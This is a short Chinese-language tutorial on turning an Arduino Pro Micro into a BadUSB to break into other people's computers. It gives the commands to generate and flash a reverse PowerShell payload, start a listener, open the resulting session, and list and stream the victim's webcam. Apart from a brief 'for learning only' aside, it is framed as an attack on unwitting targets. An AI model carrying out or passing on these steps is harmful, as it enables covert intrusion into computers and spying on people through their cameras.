# 用BadUSB物理入侵别人的电脑

## 原理

*  把恶意代码烧录进BadUSB的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。
* 把带有恶意代码的BadUSB插入目标电脑中，生成反向Shell会话
* 远程电脑登陆Shell进行各种操作，比如操纵摄像头等...（仅供学习，不要干坏事哦）

## 制作BadUSB

1. 买一块迷你型的Arduino开发板： Arduino Pro Micro（Atmega32U4）
2. 买一个microUSB的转接头
3. 自制一个好看的外壳...

## 将恶意代码烧录进BadUSB

* 打开Kail Linux，作为攻击方电脑
* git clone [https://github.com/christofersimbar/Arduino-Reverse-Shell-Generator.git](https://github.com/christofersimbar/Arduino-Reverse-Shell-Generator.git)
* cd Arduino-Reverse-Shell-Generator
* sudo ruby reverse\_powershell\_arduino.rb
* 输入攻击方的机器ip和自定义端口，一路回车，最终生成Arduino烧录用的脚本并自动启动反向Shell监听
* 用ArduinoIDE烧录恶意代码

## 进行攻击。。。

* 将BadUSB插入目标电脑，有杀毒软件是不行的 😀
* 回到刚刚烧录代码的Kail Linux机器，应该可以看到已经连接上目标电脑了
* 输入 sessions -i 1  进入目标电脑系统
* 输入 webcam\_list  扫描可用的摄像头
* 输入 webcam\_stream 1 打开目标摄像头...
* or anything you want...

## Github地址

* [https://github.com/christofersimbar/Arduino-Reverse-Shell-Generator](https://github.com/christofersimbar/Arduino-Reverse-Shell-Generator)



